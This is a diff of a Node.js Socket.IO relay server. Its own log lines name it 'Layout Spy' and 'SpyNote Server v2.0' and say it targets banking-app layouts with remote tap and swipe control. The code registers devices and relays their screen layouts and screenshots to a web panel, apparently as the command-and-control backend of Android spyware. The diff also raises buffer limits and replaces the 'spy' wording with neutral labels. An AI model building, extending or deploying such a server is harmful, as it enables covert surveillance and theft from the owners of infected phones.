@@ -9,12 +9,13 @@ const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
-    pingInterval: 25000
+    pingInterval: 25000,
+    maxHttpBufferSize: 50e6 // 50MB for large screenshots
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
 
 const devices = new Map();
 
@@ -34,24 +35,24 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("📱 Layout Spy joined:", deviceId);
+            console.log("📱 Device registered:", deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // Relay LAYOUT (CRITICAL)
-    socket.on('layout-dump', (data) => {
+    // 🔥 Layout relay (Primary)
+    socket.on('layout-update', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('layout-dump', data);
+            socket.to(deviceId).emit('layout-update', data);
         }
     });
 
-    // Relay SCREENSHOT
-    socket.on('screen-frame', (data) => {
+    // Screenshot relay (Backup)
+    socket.on('screen-update', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-frame', data);
+            socket.to(deviceId).emit('screen-update', data);
         }
     });
 
@@ -86,6 +87,7 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 Layout Spy Server: http://localhost:${PORT}`);
-    console.log(`📱 Banking App Layout + Tap/Swipe READY!`);
+    console.log(`🚀 SpyNote Server v2.0 running on port ${PORT}`);
+    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
+    console.log(`📱 Layout + Screenshot Streaming Ready!`);
 });
